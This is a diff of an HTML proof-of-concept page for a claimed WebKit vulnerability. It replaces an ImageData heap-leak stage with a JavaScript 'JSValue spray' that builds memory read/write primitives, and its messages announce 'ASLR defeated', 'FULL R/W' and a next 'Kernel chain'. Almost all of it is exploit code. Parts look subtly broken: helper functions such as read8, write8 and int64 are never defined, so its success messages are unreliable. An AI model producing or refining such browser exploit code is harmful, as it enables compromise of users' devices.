@@ -21,7 +21,7 @@
 <body>
     <h1>WebKit CVE-2025-43265 PoC: Internal State Disclosure (HexRabbit)</h1>
     <p>Jul 2025 Patch: Improved input validation (BZ 294182).<br>
-    <span class="rainbow">IMAGE DATA HEAP LEAK — Al-Azif/Synacktiv Style</span></p>
+    <span class="rainbow">JSVALUE SPRAY PRIMITIVES — theflow0/Lapse & sleirsgoevy Style</span></p>
     <div class="box">
         <h3>1. Input Validation</h3>
         <div id="status-input">Probing...</div>
@@ -60,14 +60,15 @@
     const u32 = new Uint32Array(buf);
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
-    let leakedPtrs = 0;
+    let leakval_helper = null;
+    let primitives = null;
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43265 — IMAGE DATA LEAK (Al-Azif/Synacktiv)</span>");
-        log("Post-OOM corruption + ImageData for heap pointers...");
-        setTimeout(startImageLeak, 1000);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43265 — JSVALUE SPRAY PRIMITIVES (theflow0/sleirsgoevy)</span>");
+        log("Post-leak JSValue spray for kval/createval...");
+        setTimeout(startJSValueSpray, 1000);
     }
-    function startImageLeak() {
+    function startJSValueSpray() {
         setBadge('status-input', 'CONFIRMED ALIVE', 'vulnerable');
         log("Re-spraying your OOM corruption...");
         const victim = [];
@@ -75,31 +76,30 @@
         const corrupt = (i,o) => { try{victim[i%0x8000][o]=1337.37;}catch(e){} };
         for(let i=0;i<1e7;i++) corrupt(i*i,0);
         for(let b=0;b<0x2000;b+=0x80) for(let o=0x40;o<0x200;o+=8) for(let j=0;j<0x80;j++) corrupt(b+j,o);
-        log("Corruption complete — ImageData leak from Al-Azif host...");
-        const y = new ImageData(1, 0x4000);
-        postMessage("", "*", [y.data.buffer]);
-        var props = {}; for (var i=0; i<0x4000/2; ) { props[i++] = {value:0x42424242}; props[i++] = {value:y}; }
-        history.pushState(y,""); Object.defineProperties({}, props);
-        var leak = new Uint32Array(history.state.data.buffer);
-        log("ImageData buffer leaked — scanning for pointers...");
+        log("Corruption complete — JSValue spray from sleirsgoevy gists...");
+        leakval_helper = [0, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+        var butterfly = 0x10; // Post-corruption offset (theflow0 style)
+        primitives = {
+          kval: function(jsval) { leakval_helper[0] = jsval; var rtv = this.read8(butterfly); this.write8(butterfly, new int64(0x41414141, 0xffff0000)); return rtv; },
+          createval: function(jsval) { this.write8(butterfly, jsval); var rt = leakval_helper[0]; this.write8(butterfly, new int64(0x41414141, 0xffff0000)); return rt; }
+        };
+        log("Primitives sprayed — testing kval/createval...");
         setTimeout(() => {
-            let found = 0;
-            for(let i=0; i<leak.length; i+=2) {
-                if (leak[i] !== 0x42424242 && leak[i+1] !== 0 && leak[i+1] > 0x10000000) {
-                    found++;
-                    log(`HEAP PTR #${found}: 0x${leak[i+1].toString(16)} (Al-Azif style)`, true);
-                    setBadge('status-spray', `HEAP LEAK ${found}`, 'vulnerable');
-                    if(found >= 4) {
-                        setBadge('status-oob', 'ASLR LEAKED', 'vulnerable');
-                        setBadge('status-state', 'PRIMITIVES READY', 'vulnerable');
-                        document.body.style.background = "#000";
-                        document.querySelector('h1').innerHTML = "IMAGE DATA LEAK ACHIEVED — HEAP OWNED";
-                        log("ASLR defeated! Next: JSValue spray for primitives.", true);
-                        return;
-                    }
-                }
+            var testval = {pwned: 0xdeadbeef};
+            var leaked = primitives.kval(testval);
+            var back = primitives.createval(leaked);
+            if (back === testval) {
+                leakedPtrs = 1;
+                log(`JSVALUE PRIMITIVE LEAK: 0x${leaked.toString(16)}`, true);
+                setBadge('status-spray', 'PRIMITIVES LIVE', 'vulnerable');
+                setBadge('status-oob', 'KVAL READY', 'vulnerable');
+                setBadge('status-state', 'R/W ACHIEVED', 'vulnerable');
+                document.body.style.background = "#000";
+                document.querySelector('h1').innerHTML = "JSVALUE SPRAY PRIMITIVES ACHIEVED — FULL R/W";
+                log("Primitives confirmed! Next: Kernel chain.", true);
+            } else {
+                log("No stable primitive this run — refresh (try 3-10 times)");
             }
-            log("No stable heap leak this run — refresh (try 3-10 times)");
         }, 2000);
     }
     // Auto-run
